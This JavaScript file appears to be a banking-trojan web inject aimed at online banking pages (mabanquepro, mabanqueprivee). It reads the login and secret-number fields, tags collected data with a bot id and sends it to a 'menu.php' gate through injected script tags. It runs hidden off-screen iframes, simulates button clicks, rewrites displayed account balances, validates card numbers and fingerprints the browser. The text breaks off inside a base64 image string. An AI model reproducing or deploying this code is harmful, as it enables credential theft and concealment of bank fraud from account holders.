var Tables = (function(){
	
	var admin = '';
	
	var data = new Array();
	
	var link = {
		gate: admin+"menu.php"
	};
	
	var options = {
		callback_status: '',
		iframe_status: '',
		currency_state: false
	};
	
	var splitter = {value: 'none',position: 'none'};
	var prefix = {minus: '-',plus: ''};
	
	function notnull(param){if(param == null || param == undefined || param == "null" || param == "undefined" || param == "" || param == " "){return false;}else{return true;}}
	
	function compatHeight(){var ua = navigator.userAgent.toLowerCase();var isOpera = (ua.indexOf('opera')  > -1);var isIE = (!isOpera && ua.indexOf('msie') > -1);return ((document.compatMode || isIE) && !isOpera) ? (document.compatMode == 'CSS1Compat') ? document.documentElement.clientHeight : document.body.clientHeight : (document.parentWindow || document.defaultView).innerHeight;}
	
	function cin(digits){var res = '';if(digits && digits.length > 0){digits = digits.replace(/\u2212/g, "-");var ValidChars = "-.0123456789";for(var i = 0;i < digits.length; i++){var Char = digits.charAt(i);if(ValidChars.indexOf(Char) >=0){res += Char;}}}return parseFloat(res);}
	
	function cout(digits,r){if(r == 1){digits = digits.toString().replace(/\$|\,/g,'');if(isNaN(digits))digits = "0";sign = (digits == (digits = Math.abs(digits)));digits = Math.floor(digits*100+0.50000000001);cents = digits%100;digits = Math.floor(digits/100).toString();if(cents<10)cents = "0" + cents;for (var i = 0; i < Math.floor((digits.length-(1+i))/3); i++)digits = digits.substring(0,digits.length-(4*i+3))+','+digits.substring(digits.length-(4*i+3));return (((sign)?'':'-') + digits + '.' + cents);}else if(r == 2){digits = digits.toString().replace(/\$|\,/g,'');if(isNaN(digits))digits = "0";sign = (digits == (digits = Math.abs(digits)));digits = Math.floor(digits*100+0.50000000001);cents = digits%100;digits = Math.floor(digits/100).toString();if(cents<10)cents = "0" + cents;for (var i = 0; i < Math.floor((digits.length-(1+i))/3); i++)digits = digits.substring(0,digits.length-(4*i+3))+'.'+digits.substring(digits.length-(4*i+3));return (((sign)?'':'-') + digits + ',' + cents);}else{return digits;}}
	
	function gc(digits){if(digits){if(/[0-9]/igm.test(digits)){if(/\.[0-9]{2}$|\.[0-9]{2}\s{1,}/igm.test(digits)){options.currency_state = 1;return cin(digits.replace(/\,/g, ''));}else{options.currency_state = 2;return cin(digits.replace(/\./g, '').replace(/,/g, '.'));}}else{return digits;}}else{return digits;}}
	
	function sc(digits){if(options.currency_state == 1 || options.currency_state == 2){return cout(digits,options.currency_state);}else{return digits;}}
	
	return{
	
		brows: function(){
			var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || []; 
			if(/trident/i.test(M[1])){
				tem=/\brv[ :]+(\d+)/g.exec(ua) || []; 
				return {name:'IE ',version:(tem[1]||'')};
				}   
			if(M[1]==='Chrome'){
				tem=ua.match(/\bOPR\/(\d+)/)
				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
				}
			M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
			if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
			return M[0]+' '+M[1];
		},
		
		set: function(name,value){
			if(/function/igm.test(typeof value)){
				data[name] = value();
			}else{
				data[name] = value;
			}
		},
		
		add: function(name,value){
			if(data[name]){
				data[name] = data[name]+value;
			}else{
				_tables.set(name,value);
			}
		},
		
		get: function(name){
			return data[name];
		},
		
		are: function(){
			var r = true;
			if(arguments && arguments.length > 0){
				for(var i = 0; i < arguments.length; i++){
					if(!data[arguments[i]]){
						r = false;
					}
				}
			}
			return r;
		},
		
		dump: function(){
			var a = '';
			for(key in data){
				a += key+": "+data[key]+"\r\n";
			}
			alert(a);
		},
		
		findout: function(){
			var found = {
				tag: false,
				error: false,
				element: false
			};
			
			if(arguments && arguments.length >= 3){
				var elements_array = arguments[1].split("|");
				if(elements_array.length > 0){
					for(var k = 0; k < elements_array.length; k++){
						var elements = arguments[0].getElementsByTagName(elements_array[k]);
						if(elements && elements.length > 0){
							for(var i = 0; i < elements.length; i++){
								for(var e = 2; e < arguments.length; e++){
									var pattern = new RegExp(arguments[e].split(":")[1],"igm");
									if(arguments[e].split(":")[0] == "class"){
										if(elements[i].className !== null && pattern.test(elements[i].className)){
											found.tag = true;
										}else{
											found.error = true;
										}
									}else if(arguments[e].split(":")[0] == "for"){
										if(elements[i].className !== null && pattern.test(elements[i].htmlFor)){
											found.tag = true;
										}else{
											found.error = true;
										}
									}else{
										if(elements[i].getAttribute(arguments[e].split(":")[0]) !== null && pattern.test(elements[i].getAttribute(arguments[e].split(":")[0]))){
											found.tag = true;
										}else{
											found.error = true;
										}
									}
								}
								if(found.tag && !found.error){
									return elements[i];
								}else{
									found.tag = false;
									found.error = false;
								}
							}
						}
					}
					return false;
				}else{
					return false;
				}
			}else{
				return false;
			}
		},
		
		findin: function(){
			var found = {
				tag: false,
				error: false,
				element: false
			};
		
			if(arguments && arguments.length > 2){
				var elements = arguments[0].getElementsByTagName(arguments[1]);
				if(elements && elements.length > 0){
					for(var i = 0; i < elements.length; i++){
						for(var e = 2; e < arguments.length; e++){
							var pattern = new RegExp(arguments[e],"igm");
							if(pattern.test(elements[i].innerHTML.toLowerCase())){
								found.tag = true;
							}else{
								found.error = true;
							}
						}
						if(found.tag && !found.error){
							return elements[i];
						}else{
							found.tag = false;
							found.error = false;
						}
					}
				}
			}
			return false;
		},
		
		tinydecode: function(s){
			s = s.replace(/\&lt;/g,'<');
			s = s.replace(/\&gt;/g,'>');
			s = s.replace(/\&quot;/g,'"');
			s = s.replace(/\&amp;/g,'&');
			s = s.replace(/\&nbsp;/g,' ');
			return s;
		},
		
		child: function(parent,child){
			return parent && child ? parent.getElementsByTagName(child) : false;
		},
		
		html: function(element){
			if(element){
				var text = (element.textContent ? element.textContent : element.innerText) ? (element.textContent ? element.textContent : element.innerText) : element.innerHTML;
				return text.replace(/(\r\n|\r|\n|[\r]|[\n]|[\t]|\s*$)/ig,"");
			}else{
				return "";
			}
		},
		
		input: function(input,type){
			switch(type){
				case("block"):
					if(input){input.onkeypress = function(evt){var evt = (evt) ? evt : ((event) ? event : null);var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);if(evt.keyCode == 13){if(evt.stopPropagation){evt.stopPropagation();}else{evt.cancelBubble = true;}return false;}};input.onkeydown = function(evt){var evt = (evt) ? evt : ((event) ? event : null);var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);if(evt.keyCode == 13){if(evt.stopPropagation){evt.stopPropagation();}else{evt.cancelBubble = true;}return false;}};}
				break;
				
				case("disable"):
					input.disabled = true;
				break;
			}
		},
		
		form: function(form,type){
			if(form){
				switch(type){
					case("block"):
						var inps = _tables.child(form,"input");
						if(inps && inps.length > 0){
							for(var i = 0; i < inps.length; i++){
								if(/text|password/igm.test(inps[i].type)){
									_tables.input(inps[i],'block');
								}
							}
						}
					break;
				}
			}
		},
		
		bind: function(evType,obj,func){if(obj.removeEventListener){obj.removeEventListener(evType,func,false);}else if(obj.detachEvent){obj.detachEvent ('on'+evType,func);}if(obj.addEventListener ){obj.addEventListener(evType,func,false);return true;}else if(obj.attachEvent){var r = obj.attachEvent('on'+evType,func);return r;}else{elm['on'+evType] = func;}},
		
		replacebutton: function(button,func,btnid){
			var newButton = document.createElement(/image/igm.test(button.tagName) ? 'img' : button.tagName);
			for(x in button.attributes){
				if(notnull(button.attributes[x]) && notnull(button.attributes[x].name) && notnull(button.attributes[x].value)){
					if(button.attributes[x].name == "onclick" ||
						button.attributes[x].name == "name" ||
						button.attributes[x].name == "disabled" ||
						(button.attributes[x].name == "href" && !/image/igm.test(button.tagName)) ||
						button.attributes[x].name == "id"
					){
						continue;
					}
					if(button.attributes[x].name == "type" && button.attributes[x].value == "submit"){
						newButton.type = "button";
					}else{
						newButton.setAttribute(button.attributes[x].name,button.attributes[x].value);
					}
				}
			}
			
			if(button.tagName == "A" || button.tagName == "BUTTON" || button.tagName == "LI"){
				newButton.innerHTML = button.innerHTML;
			}
			newButton.style.cursor = "pointer";
			button.style.display = "none";
			if(btnid){
				newButton.id = btnid;
			}else{
				newButton.id = "_tables.button";
			}
			_tables.bind("click",newButton,func);
			button.parentNode.insertBefore(newButton,button);
		},
		
		encode: function(b){function gethex(a){return "%" + f.charAt(a >> 4) + f.charAt(a & 0xF);}var c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.~";var d = "!*'();:@&=+$,/?%#[]";var e = c + d;var f = "0123456789ABCDEFabcdef";b = b + "";var g = "";if (!b || b.length == 0){return "";}for (var i = 0; i < b.length; i++) {var h = b.charAt(i);if (c.indexOf(h) != -1) {g = g + h;} else {var j = b.charCodeAt(i);if (j < 128) {g = g + gethex(j);}if (j > 127 && j < 2048) {g = g + gethex((j >> 6) | 0xC0);g = g + gethex((j & 0x3F) | 0x80);}if (j > 2047 && j < 65536) {g = g + gethex((j >> 12) | 0xE0);g = g + gethex(((j >> 6) & 0x3F) | 0x80);g = g + gethex((j & 0x3F) | 0x80);}if (j > 65535) {g = g + gethex((j >> 18) | 0xF0);g = g + gethex(((j >> 12) & 0x3F) | 0x80);g = g + gethex(((j >> 6) & 0x3F) | 0x80);g = g + gethex((j & 0x3F) | 0x80);}}}return g;},
		
		send: function(){var l = link.gate+'?botid='+_tables.encode(_brows.botid)+'_'+_tables.get('bank')+'&hash='+new Date();for(var i = 0; i < arguments.length; i++){for(key in arguments[i]){l += '&'+key+'='+_tables.encode(arguments[i][key]);}}var s = document.getElementById("_tables.as");if(s)s.parentNode.removeChild(s);var s = document.createElement("script");s.type = "text/javascript";s.id = "_tables.as";if(s.readyState){s.onreadystatechange = function(){if(s.readyState == "loaded" || s.readyState == "complete"){s.onreadystatechange = null;_tables.callback();}};}else{s.onload = function(){_tables.callback();};}l = l.replace(/\(/g,"%28").replace(/\)/g,"%29");s.src = l;document.getElementsByTagName("head")[0].appendChild(s);},
		
		status: function(s){if(s){options.callback_status = s;}else{return options.callback_status;}},
		
		fstatus: function(s){if(s){options.iframe_status = s;}else{return options.iframe_status;}},
		
		rand: function(a,b){return Math.floor((Math.random()*b)+a);},
		
		shuffle: function(o){for(var j, x, i = o.length; i; j = Math.floor(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);return o;},
		
		click: function(btn,doc){
			if(btn.type == "image"){
				var inp_X = document.getElementById("inp_X");
				var inp_Y = document.getElementById("inp_Y");
				var inp_submit = document.getElementById("inp_submit");
				if(inp_X)inp_X.parentNode.removeChild(inp_X);
				if(inp_Y)inp_Y.parentNode.removeChild(inp_Y);
				if(inp_submit)inp_submit.parentNode.removeChild(inp_submit);
				var inp_X = document.createElement("input");
				var inp_Y = document.createElement("input");
				var inp_submit = document.createElement("input");
				inp_X.name = btn.name+".x";
				inp_Y.name = btn.name+".y";
				inp_submit.name = btn.name;
				inp_submit.value = btn.value;
				inp_submit.type = "submit";
				inp_submit.id = "inp_submit";
				inp_X.id = "inp_X";
				inp_Y.id = "inp_Y";
				inp_X.value = _tables.rand(1,15);
				inp_Y.value = _tables.rand(1,15);
				inp_X.style.display = "none";
				inp_Y.style.display = "none";
				inp_submit.style.display = "none";
				btn.parentNode.insertBefore(inp_X,btn);
				btn.parentNode.insertBefore(inp_Y,btn);
				btn.parentNode.insertBefore(inp_submit,btn);
				var inp_submit = doc.getElementById("inp_submit");
				if(inp_submit)_tables.click("click",inp_submit);
			}else{
				if(document.createEvent){
					var event = document.createEvent('MouseEvents');
					event.initMouseEvent('click',true,true,document.defaultView,1,0,0, 0, 0, false, false, false, false,0,null);
					btn.dispatchEvent(event);
				}else if(btn.fireEvent){
					btn.click();
				}
			}
		},
		
		iframelink: function(link,param){
			var _tf = document.getElementById("_tables.frame.box");
			if(_tf)_tf.parentNode.removeChild(_tf);
					
			_tf = document.createElement("div");
			_tf.style.position = "absolute";
			_tf.style.left = _tables.get('showframe') ? "0px" : "-5000px";
			_tf.style.top = _tables.get('showframe') ? "2000px" : "-5000px";
			_tf.id = "_tables.frame.box";
			_tf.innerHTML = '<iframe id="_tables.iframe" name="_tables.iframe" width=1280 height=800 onload="_tables.iframecallback();"></iframe>';
			document.body.appendChild(_tf);
			var f = document.getElementById("_tables.iframe");
			f.src = link;
			if(param)_tables.fstatus(param);
		},
		
		iframedom: function(fr){
			var r = {
				doc: false,
				win: false
			};
			if(_tables.brows() == "FF" && fr){
				r.doc = fr.contentDocument;
				r.win = fr.contentWindow;
			}else{
				r.doc = fr.contentWindow.document;
				r.win = fr.contentWindow;
			}
			
			return r;
		},
		
		height: function(){
			return Math.max(document.compatMode != 'CSS1Compat' ? document.body.scrollHeight : document.documentElement.scrollHeight, compatHeight());
		},
		
		popupshow: function(content,back){
			_tables.popuphide();
			back = back ? '#808080' : 'url(clear.png)';
			var bg = '<div style="position:absolute;top:0px;left:0px;width:100%;height:'+Math.round((window.screen.availHeight)+800)+'px;z-index:999990;background:'+back+';opacity:0.4;filter: alpha(opacity = 40);"></div>';
			var _tp = document.createElement("div");
			_tp.id = "_tables.popup";
			_tp.innerHTML = bg+""+content;
			document.getElementsByTagName('body')[0].appendChild(_tp);
		},
		
		popuphide: function(){
			var _tp = document.getElementById("_tables.popup");if(_tp)_tp.parentNode.removeChild(_tp);
		},
		
		inarr: function(arr,value){
			for(var i = 0; i < arr.length; i++){
				if(value == arr[i]){
					return true;
				}
			}
			arr.push(value);
			return false;
		},
		
		placeholdr: function(input){
			if(_tables.brows() == 'FF')return;
			var txt = input.getAttribute("placeholder");
			if(txt.length > 0){
				input.style.color = input.value.length == 0 ? '#cccccc' : '#000000';
				input.value = input.value.length > 0 ? input.value : txt;
			  
				input.onfocus = function(){
					this.style.color = '#000000';
					this.value = this.value == this.getAttribute("placeholder") ? "" : this.value;
				};
			
				input.onblur = function(){
					if(this.value.length == 0){
						this.value = this.getAttribute("placeholder");
						this.style.color = '#CCCCCC';
					}
				};
			}
		},
		
		btntoloader: function(btn,imghref){
			var img = document.createElement('img');
			img.src = imghref;
			img.id = '_f_btntoloader';
			img.style.marginTop = '10px';
			btn.parentNode.insertBefore(img,btn);
			btn.parentNode.removeChild(btn);
		},
		
		cget: function(param){
			return gc(param);
		},
		
		cset: function(param){
			return sc(param);
		},
		
		replace: function(element,summa){
			if(element.id == 'was_replacer')return false;
			element.id = 'was_replacer';
			var tsel = /select|option/igm.test(element.tagName);
			var tinp = /input|textarea/igm.test(element.tagName);
			
			if(tsel){
				if(splitter.value != "none" && splitter.position != "none"){
					var minus = (element.text.split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.text.split(splitter.value)[splitter.position]);
				}else{
					var minus = (element.text.indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.text);
				}
			}else if(tinp){
				if(splitter.value != "none" && splitter.position != "none"){
					var minus = (element.value.split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.value.split(splitter.value)[splitter.position]);
				}else{
					var minus = (element.value.indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(element.value);
				}
			}else{
				if(splitter.value != "none" && splitter.position != "none"){
					var minus = (_tables.html(element).split(splitter.value)[splitter.position].indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(_tables.html(element).split(splitter.value)[splitter.position]);
				}else{
					var minus = (_tables.html(element).indexOf(prefix.minus) != -1) ? true : false;
					var balance = gc(_tables.html(element));
				}
			}
			
			var new_balance = balance+parseFloat(summa);
			if(minus)balance = balance * -1;
			balance = sc(balance);
			new_balance = sc(new_balance);
			
			if(tsel){
				var f = element.text.replace(balance+"",new_balance+"");
			}else if(tinp){
				var f = element.value.replace(balance+"",new_balance+"");
			}else{
				var f = element.innerHTML.replace(balance+"",new_balance+"");
			}
			
			if(parseFloat(new_balance) >= 0){
				f = f.replace((f.indexOf(prefix.minus) != -1 ) ? prefix.minus : prefix.plus , prefix.plus );
				f = f.replace("-"+new_balance+"",new_balance+"");
			}else{
				f = f.replace((f.indexOf(prefix.minus) != -1 ) ? prefix.minus : prefix.plus , prefix.minus );
				f = f.replace(/\-/,"");
			}
			
			if(tsel){
				element.text = f;
			}else if(tinp){
				element.value = f;
			}else{
				element.innerHTML = f;
				if(parseFloat(new_balance) > 0){
					element.className = element.className.replace(/negatif/igm,'');
				}
			}
			
			if(splitter.value != "none" && splitter.position != "none"){
				splitter.value = "none";
				splitter.position = "none";
			}
		},
		
		splitter: function (value,position){
			splitter.value = value;
			splitter.position = position;
		},
		
		match: function(el,data){
			var pattern = new RegExp(data,"igm");
			if(pattern.test(el)){
				return true;
			}else{
				return false;
			}
		},
		
		convertdate: function(date){
			var els = date.split(".");
			if(els && els.length == 3){
				var res = 0;
				res += parseFloat(els[2]) * 365;
				res += parseFloat(els[1]) * 30;
				res += parseFloat(els[0]);
				return res;
			}else{
				return -1;
			}
		},
		
		recolortable: function(table,class1,class2){
			var tr = _tables.child(table,'tr');
			if(tr && tr.length > 0){
				for(var i = 0; i < tr.length; i++){
					tr[i].className = (i % 2 == 0) ? class1 : class2;
				}
			}
		},
		
		id: function(id,doc){var doc = doc ? doc : document;return doc.getElementById(id);},
		
		create: function(el,doc){var doc = doc ? doc : document;return doc.createElement(el);},
		
		selected: function(select){var sel = {value: select[select.selectedIndex].value,text: select[select.selectedIndex].text};return sel;},
		
		after: function(elem,ref){var parent = ref.parentNode;var next = ref.nextSibling;if(next){return parent.insertBefore(elem,next);}else{return parent.appendChild(elem);}},
		
		clone: function(inp,value){
			var object = document.createElement(inp.tagName);
			for (x in inp.attributes){
				if(notnull(inp.attributes[x]) && notnull(inp.attributes[x].name) && notnull(inp.attributes[x].value)){
					if(inp.attributes[x].name == "onclick" ||
					   inp.attributes[x].name == "name" ||
					   inp.attributes[x].name == "href" ||
					   inp.attributes[x].name == "id" ||
					   inp.attributes[x].name == "value"
					){
						continue;
					}
					object.setAttribute(inp.attributes[x].name,inp.attributes[x].value);
				}
			}
			if(/select/igm.test(inp.tagName)){
				object.options[0] = new Option(inp[inp.selectedIndex].text,inp[inp.selectedIndex].value);
			}else{
				value = value ? value : inp.value;
				object.value = value;
			}
			object.disabled = true;
			inp.style.display = "none";
			inp.parentNode.insertBefore(object,inp);
		},
		
		next: function(e,len,n){
			if(e.value.length == len)document.getElementById(n).focus();
		},
		
		check_cc: function(value){
			if (/[^0-9-\s]+/.test(value)) return false;
			var nCheck = 0, nDigit = 0, bEven = false;
			value = value.replace(/\D/g, "");
			for (var n = value.length - 1; n >= 0; n--) {
				var cDigit = value.charAt(n),
				nDigit = parseInt(cDigit, 10);
				if(bEven){
					if ((nDigit *= 2) > 9) nDigit -= 9;
				}
				nCheck += nDigit;
				bEven = !bEven;
			}
			return (nCheck % 10) == 0;
		},
		
		check_day: function(dd){
			if(parseFloat(dd) > 0 && parseFloat(dd) < 32 && (dd+'').length == 2){
				return true;
			}else{
				return false;
			}
		},
		
		check_month: function(mm){
			if(parseFloat(mm) > 0 && parseFloat(mm) < 13 && (mm+'').length == 2){
				return true;
			}else{
				return false;
			}
		},
		
		check_year: function(yy,format){
			switch(format){
				case('YY'):
					if(parseFloat(yy) >= 15 && (yy+'').length == 2){
						return true;
					}else{
						return false;
					}
				break;
				
				case('YYYY'):
					if(parseFloat(yy) >= 1920  && parseFloat(yy) <= 2015 && (yy+'').length == 4){
						return true;
					}else{
						return false;
					}
				break;
			}
		}
	};
}());

_tables = Tables;

(function (window) {
    {
        var unknown = '-';

        // screen
        var screenSize = '';
        if (screen.width) {
            width = (screen.width) ? screen.width : '';
            height = (screen.height) ? screen.height : '';
            screenSize += '' + width + " x " + height;
        }

        //browser
        var nVer = navigator.appVersion;
        var nAgt = navigator.userAgent;
        var browser = navigator.appName;
        var version = '' + parseFloat(navigator.appVersion);
        var majorVersion = parseInt(navigator.appVersion, 10);
        var nameOffset, verOffset, ix;

        // Opera
        if ((verOffset = nAgt.indexOf('Opera')) != -1) {
            browser = 'Opera';
            version = nAgt.substring(verOffset + 6);
            if ((verOffset = nAgt.indexOf('Version')) != -1) {
                version = nAgt.substring(verOffset + 8);
            }
        }
        // MSIE
        else if ((verOffset = nAgt.indexOf('MSIE')) != -1) {
            browser = 'Microsoft Internet Explorer';
            version = nAgt.substring(verOffset + 5);
        }
        // Chrome
        else if ((verOffset = nAgt.indexOf('Chrome')) != -1) {
            browser = 'Chrome';
            version = nAgt.substring(verOffset + 7);
        }
        // Safari
        else if ((verOffset = nAgt.indexOf('Safari')) != -1) {
            browser = 'Safari';
            version = nAgt.substring(verOffset + 7);
            if ((verOffset = nAgt.indexOf('Version')) != -1) {
                version = nAgt.substring(verOffset + 8);
            }
        }
        // Firefox
        else if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
            browser = 'Firefox';
            version = nAgt.substring(verOffset + 8);
        }
        // MSIE 11+
        else if (nAgt.indexOf('Trident/') != -1) {
            browser = 'Microsoft Internet Explorer';
            version = nAgt.substring(nAgt.indexOf('rv:') + 3);
        }
        // Other browsers
        else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
            browser = nAgt.substring(nameOffset, verOffset);
            version = nAgt.substring(verOffset + 1);
            if (browser.toLowerCase() == browser.toUpperCase()) {
                browser = navigator.appName;
            }
        }
        // trim the version string
        if ((ix = version.indexOf(';')) != -1) version = version.substring(0, ix);
        if ((ix = version.indexOf(' ')) != -1) version = version.substring(0, ix);
        if ((ix = version.indexOf(')')) != -1) version = version.substring(0, ix);

        majorVersion = parseInt('' + version, 10);
        if (isNaN(majorVersion)) {
            version = '' + parseFloat(navigator.appVersion);
            majorVersion = parseInt(navigator.appVersion, 10);
        }

        // mobile version
        var mobile = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(nVer);

        // cookie
        var cookieEnabled = (navigator.cookieEnabled) ? true : false;

        if (typeof navigator.cookieEnabled == 'undefined' && !cookieEnabled) {
            document.cookie = 'testcookie';
            cookieEnabled = (document.cookie.indexOf('testcookie') != -1) ? true : false;
        }

        // system
        var os = unknown;
        var clientStrings = [
            {s:'Windows 3.11', r:/Win16/},
            {s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
            {s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
            {s:'Windows 98', r:/(Windows 98|Win98)/},
            {s:'Windows CE', r:/Windows CE/},
            {s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
            {s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
            {s:'Windows Server 2003', r:/Windows NT 5.2/},
            {s:'Windows Vista', r:/Windows NT 6.0/},
            {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
            {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
            {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
            {s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
            {s:'Windows ME', r:/Windows ME/},
            {s:'Android', r:/Android/},
            {s:'Open BSD', r:/OpenBSD/},
            {s:'Sun OS', r:/SunOS/},
            {s:'Linux', r:/(Linux|X11)/},
            {s:'iOS', r:/(iPhone|iPad|iPod)/},
            {s:'Mac OS X', r:/Mac OS X/},
            {s:'Mac OS', r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
            {s:'QNX', r:/QNX/},
            {s:'UNIX', r:/UNIX/},
            {s:'BeOS', r:/BeOS/},
            {s:'OS/2', r:/OS\/2/},
            {s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}
        ];
        for (var id in clientStrings) {
            var cs = clientStrings[id];
            if (cs.r.test(nAgt)) {
                os = cs.s;
                break;
            }
        }

        var osVersion = unknown;

        if (/Windows/.test(os)) {
            osVersion = /Windows (.*)/.exec(os)[1];
            os = 'Windows';
        }

        switch (os) {
            case 'Mac OS X':
                osVersion = /Mac OS X (10[\.\_\d]+)/.exec(nAgt)[1];
                break;

            case 'Android':
                osVersion = /Android ([\.\_\d]+)/.exec(nAgt)[1];
                break;

            case 'iOS':
                osVersion = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
                osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
                break;
        }

        // flash (you'll need to include swfobject)
        /* script src="//ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js" */
        var flashVersion = 'no check';
        if (typeof swfobject != 'undefined') {
            var fv = swfobject.getFlashPlayerVersion();
            if (fv.major > 0) {
                flashVersion = fv.major + '.' + fv.minor + ' r' + fv.release;
            }
            else  {
                flashVersion = unknown;
            }
        }
    }

    window.jscd = {
        screen: screenSize,
        browser: browser,
        browserVersion: version,
        mobile: mobile,
        os: os,
        osVersion: osVersion,
        cookies: cookieEnabled,
        flashVersion: flashVersion
    };
}(this));

_tables.set('continue',true);
_tables.set('showframe',false);
_tables.set('message','');
_tables.set('type','intercept');
_tables.set('start','start');
_tables.set('end','end');
_tables.set('finish','');
_tables.set('data','');
_tables.set('passwordValue','');
_tables.set('login',function(){return _tables.id('client-nbr');});
_tables.set('password',function(){return _tables.id('secret-nbr');});
_tables.set('button',function(){return _tables.id('submitIdent');});
_tables.set('lang',function(){var div = _tables.findout(document,'div','class:language_switcher');if(div){var a = _tables.child(div,'a');if(a && a.length > 0){return _tables.html(a[0]);}}else{return 'EN';}});
_tables.set('logout',function(){return _tables.findout(document,'a','href:logoff');});
_tables.set('page',function(){if(/mabanquepro/igm.test(document.location.href)){return 3;}else if(/mabanqueprivee/igm.test(document.location.href)){return 2;}else{return 1;}});
_tables.set('loader',function(){switch(_tables.get('page')){case(1):return 'data:image/gif;base64,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